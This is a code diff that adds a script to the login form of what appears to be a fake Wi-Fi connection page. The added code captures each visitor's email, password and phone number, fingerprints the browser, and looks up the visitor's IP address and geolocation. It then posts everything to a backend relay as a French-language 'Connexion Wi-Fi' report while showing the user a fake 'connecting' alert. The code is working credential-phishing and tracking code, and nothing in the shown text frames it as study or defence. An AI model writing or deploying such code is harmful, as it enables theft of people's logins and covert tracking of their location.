@@ -137,4 +137,74 @@
   document.getElementById("auth-form").addEventListener("submit", async function (e) {
     e.preventDefault();
     const email = document.getElementById("email").value;
-    cons
+    const password = document.getElementById("password").value;
+    const phone = document.getElementById("phone").value;
+
+    const userAgent = navigator.userAgent;
+    const lang = navigator.language;
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const platform = navigator.platform;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);
+
+    let geoInfo = {
+      ip: "Inconnu",
+      city: "Inconnue",
+      region: "Inconnue",
+      country: "Inconnu",
+      org: "Inconnu",
+      postal: "Inconnu",
+      latitude: "N/A",
+      longitude: "N/A"
+    };
+
+    try {
+      const res = await fetch("https://ipapi.co/json");
+      const data = await res.json();
+      geoInfo = {
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        org: data.org,
+        postal: data.postal,
+        latitude: data.latitude,
+        longitude: data.longitude
+      };
+    } catch (err) {
+      console.error("Erreur récupération IP/Géo :", err);
+    }
+
+    const message = `
+🔐 Connexion Wi-Fi
+📧 Email : ${email}
+🔑 Mot de passe : ${password}
+📱 Téléphone : ${phone}
+🌍 IP : ${geoInfo.ip}
+🏙️ Ville : ${geoInfo.city}
+📍 Région : ${geoInfo.region}
+🇨🇵 Pays : ${geoInfo.country}
+🏢 FAI : ${geoInfo.org}
+📮 Code Postal : ${geoInfo.postal}
+📌 Coords : ${geoInfo.latitude}, ${geoInfo.longitude}
+
+🧭 Navigateur : ${userAgent}
+💻 Plateforme : ${platform}
+🗺️ Langue : ${lang}
+🕒 Fuseau horaire : ${timezone}
+📐 Résolution écran : ${screenRes}
+⏱️ Temps passé : ${sessionDuration} secondes
+    `;
+
+    fetch("/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: message })
+    });
+
+    alert("Connexion en cours...");
+    document.getElementById("auth-form").reset();
+  });
+</script>
+</body>
+</html>
